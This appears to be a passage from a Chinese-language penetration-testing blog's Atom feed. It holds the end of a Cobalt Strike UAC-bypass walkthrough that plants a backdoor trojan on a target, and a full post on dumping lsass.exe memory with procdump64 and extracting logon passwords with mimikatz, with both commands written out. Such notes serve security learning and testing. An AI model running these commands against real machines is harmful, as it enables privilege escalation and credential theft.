src="/2019/11/08/Windows下bypassuac/shell.png" alt><br>一样的，首先生成一个后门木马，上传到目标机器上面，并且运行<br><img src="/2019/11/08/Windows下bypassuac/sherl.png" alt><br>看到这里有回显了，右键进入beacon，输入bypassuac<br><img src="/2019/11/08/Windows下bypassuac/csbypass.png" alt><br>然后设置好监听的端口，输入命令<br><img src="/2019/11/08/Windows下bypassuac/cs.png" alt><br>就成功啦~</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一直都搞不懂bypassuac是啥，到底有啥用啊，后来经过高人的指点，突然之间就悟了！&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="提权" scheme="http://yoursite.com/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>使用procdump64和mimikatz抓取Windows用户密码</title>
    <link href="http://yoursite.com/2019/11/08/%E4%BD%BF%E7%94%A8procdump64%E5%92%8Cmimikatz%E6%8A%93%E5%8F%96Windows%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81/"/>
    <id>http://yoursite.com/2019/11/08/使用procdump64和mimikatz抓取Windows用户密码/</id>
    <published>2019-11-08T08:52:49.000Z</published>
    <updated>2020-01-13T04:49:25.546Z</updated>
    
    <content type="html"><![CDATA[<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>今天在渗透的时候，利用mimikata抓取用户密码报错了，很曹丹，于是就有了这篇文章<br><a id="more"></a><br><img src="/2019/11/08/使用procdump64和mimikatz抓取Windows用户密码/error.png" alt><br>报错：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)</span><br></pre></td></tr></table></figure></p><h1 id="解决方式"><a href="#解决方式" class="headerlink" title="解决方式"></a>解决方式</h1><p>利用procdump64+mimikatz解决，前提是windows要运行了lsass.exe<br><img src="/2019/11/08/使用procdump64和mimikatz抓取Windows用户密码/lsass.png" alt></p><p>并且命令要在cmd右键管理员身份运行，这里就要bypassuac了，不然运行命令会保存</p><p>lsass.exe用户安全和登陆策略，我们要通过procdump64读取其中的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure></p><p>然后用mimikatz读取这个生成的文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit</span><br></pre></td></tr></table></figure></p><p>就成功了</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;问题&quot;&gt;&lt;a href=&quot;#问题&quot; class=&quot;headerlink&quot; title=&quot;问题&quot;&gt;&lt;/a&gt;问题&lt;/h1&gt;&lt;p&gt;今天在渗透的时候，利用mimikata抓取用户密码报错了，很曹丹，于是就有了这篇文章&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="后渗透" scheme="http://yoursite.com/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
</feed>
